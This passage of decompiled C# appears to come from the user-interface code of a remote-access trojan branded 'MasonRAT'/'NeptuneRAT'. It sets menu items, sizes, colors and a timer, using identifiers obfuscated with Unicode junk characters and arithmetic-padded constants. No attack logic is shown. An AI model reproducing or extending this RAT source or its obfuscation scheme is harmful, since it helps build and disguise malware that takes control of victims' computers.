\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0;
    this.\u2694️MasonRAT\u270Cڜ\u060Dٻ\u060Aڅ\u060A\u060C\u0608د̍\u060Fﯧ\u060Aــمڜ\u060Aـ\u0020.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2719);
    this.\u2694️MasonRAT\u270C\u060Fــــ\u060Eٽ\u060C̍ــٽ̨ـڅ\u060Ąـۡـ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2720);
    this.\u2694️MasonRAT\u270C\u0608\u060A\u0608ﻻڙـڙـءـټ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2721);
    this.\u2694️MasonRAT\u270C\u060Aﯧﻋدـټ\u060Fۙ\u060A\u060A\u060Aﻋ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2722);
    this.\u2694️MasonRAT\u270Cـؤ\u060Aـ̨ـ\u060Aڙּۙـ\u060D.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2723);
    this.\u2694️MasonRAT\u270Cـ\u060D\u060D\u060E\u060A\u0609ۨ\u0608ؤــ\u0608\u0608ۏـ\u060B\u0609.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2724);
    this.\u2694️MasonRAT\u270Cڙڅڛْ\u060A\u060Eڙ\u0609\u060Cﻋ\u0608.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2725);
    this.\u2694️MasonRAT\u270Cﻻــ\u0608ـاـ\u0608ﻻ\u0608\u060F\u0608.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2726);
    ToolStripItemCollection items1 = this.\u2694️MasonRAT\u270Cـڜ\u0608\u0020\u060Dـۭۙ\u060A\u060F̍ٺ.Items;
    ToolStripItem[] toolStripItems1 = new ToolStripItem[((1786006715 ^ 285817666 % 791257627) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 + 0 ^ ((308090110 ^ 15) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 << 1) | -1058771181 - (381588033 | 1199930281) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0];
    toolStripItems1[0] = (ToolStripItem) this.\u2694️MasonRAT\u270Cژـڙۛۙۡژـﻻـ\u0608ـ;
    toolStripItems1[1] = (ToolStripItem) this.\u2694️MasonRAT\u270C\u0609\u0020̍ــــ\u0608ټ\u0608ــﻋ\u060Aـۧټـ\u0020;
    items1.AddRange(toolStripItems1);
    this.\u2694️MasonRAT\u270Cـڜ\u0608\u0020\u060Dـۭۙ\u060A\u060F̍ٺ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2727);
    this.\u2694️MasonRAT\u270Cـڜ\u0608\u0020\u060Dـۭۙ\u060A\u060F̍ٺ.Size = new Size((-2012540608 ^ -314370621) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + -(-370095989 - -2069314417 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 << 1) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0, 48 /*0x30*/);
    this.\u2694️MasonRAT\u270Cژـڙۛۙۡژـﻻـ\u0608ـ.Image = (Image) NeptuneRAT.My.Resources.Resources.\u2694️MasonRAT\u270Cـ\u060Dـ\u060D\u060Eټـ\u0608ڟڣ;
    this.\u2694️MasonRAT\u270Cژـڙۛۙۡژـﻻـ\u0608ـ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2728);
    this.\u2694️MasonRAT\u270Cژـڙۛۙۡژـﻻـ\u0608ـ.Size = new Size((968069350 + 499658239 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0) - ((-1083334299 ^ -401203398) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0)) % (1204995197 - -938675529 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 >> 1) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0, 22);
    this.\u2694️MasonRAT\u270Cژـڙۛۙۡژـﻻـ\u0608ـ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2729);
    this.\u2694️MasonRAT\u270C\u0609\u0020̍ــــ\u0608ټ\u0608ــﻋ\u060Aـۧټـ\u0020.Image = (Image) NeptuneRAT.My.Resources.Resources.\u2694️MasonRAT\u270Cح\u0608\u0609ـبــ؁\u060C\u0608;
    this.\u2694️MasonRAT\u270C\u0609\u0020̍ــــ\u0608ټ\u0608ــﻋ\u060Aـۧټـ\u0020.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2730);
    this.\u2694️MasonRAT\u270C\u0609\u0020̍ــــ\u0608ټ\u0608ــﻋ\u060Aـۧټـ\u0020.Size = new Size(((1258634703 > 254049905 ? 609969 : 813292) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 >> 1 ^ 1410796953 - 161828363 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) >> -1595545351 - -1868893810 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0, 22);
    this.\u2694️MasonRAT\u270C\u0609\u0020̍ــــ\u0608ټ\u0608ــﻋ\u060Aـۧټـ\u0020.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2731);
    this.\u2694️MasonRAT\u270C\u060Dـٻۜڝ\u0609ــ\u0608ىحـڦـ.Enabled = true;
    this.\u2694️MasonRAT\u270C\u060Dـٻۜڝ\u0609ــ\u0608ىحـڦـ.Interval = 487534591 - 487533593 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + (165605194 - (849069658 << 1392696607) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 + 0 >> (1057771710 - 891618340 % 1074613216 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0;
    this.\u2694️MasonRAT\u270Cڙٻ\u0608ـــڙـئﮪۙٺ.TargetControl = (Control) this;
    this.\u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609.Controls.Add((Control) this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F);
    this.\u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609.Controls.Add((Control) this.\u2694️MasonRAT\u270Cـ\u060A\u060Dـ\u060Bـ\u060Fـ\u060Cْۛبٺ\u060Eـ);
    this.\u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609.Controls.Add((Control) this.\u2694️MasonRAT\u270Cــــئۡـ\u0608ۧـــٽـ);
    this.\u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609.Cursor = Cursors.SizeAll;
    this.\u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609.Dock = (DockStyle) ((336987784 + (772313023 | 1979905442) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1)) + (~1899610664 - 691512655 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1) | 509321866 - 284997972 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 << 1) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0);
    this.\u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609.FillColor = Color.FromArgb((-622286075 ^ 1396342936 % 496338770) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) + (1547355997 - 1421995921 % 899632478 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0, ((80856764 ^ 2119387827 % 2038531073) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0 ^ (241750476 ^ 1803809604 % 781029558) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0, 670841356 + (2026098175 >> 1235691245) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - ((991101937 > 214564417 ? 524498250 : 699331000) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << (1171972937 + (1678364446 >> 65969412) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0);
    this.\u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609.FillColor2 = Color.FromArgb(1560538261 - 334228602 % 1299491560 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) - (((900888839 > 1776715901 ? -1795411782 : 1874666636) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0) << ((1776847197 | 39944487) - 1311865774 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0, ((2044863716 - 1215325120 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0) > 703279137 - 245283566 % 1852593202 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0 ? 1079958941 - 1079958915 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 << 1) : (36 ^ 6) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0, (1201751361 + 2087230160 % 1770824842 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 << 1) - (-817022115 - (1412880205 << 796722452) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0);
    this.\u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609.FillColor3 = Color.FromArgb(((632798147 - 89927488 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0) > 805407331 + 471040526 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ? (2113652703 ^ (2038155249 | 1422591323)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) : -748746183 - ~748746209 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0, (1049027181 - 868039661 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0) + -((250142223 > 1613604280 ? 241316658 : 180987494) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 >> 1) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0, (1637293235 ^ 1765950564 << 1747740664) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) - ((-1973859135 ^ ~352291655) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0) % ((229181166 << 883338088) - 1296355856 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0);
    this.\u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609.FillColor4 = Color.FromArgb((-1902875896 ^ 19) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) + ((1902875932 ^ 9) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0, (430569495 - (1634267496 | 1289582564) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0) - (1256016514 + 599458000 % 557588583 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1) << (1236851919 + (1353768167 >> 1378258894) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0, 1967105880 + 249184365 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + ((37480267 ^ (1003874059 | 1884035264)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0 | -781348011 - (411337416 | 1963557380) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0);
    this.\u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609.Location = new Point(0, 0);
    this.\u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2732);
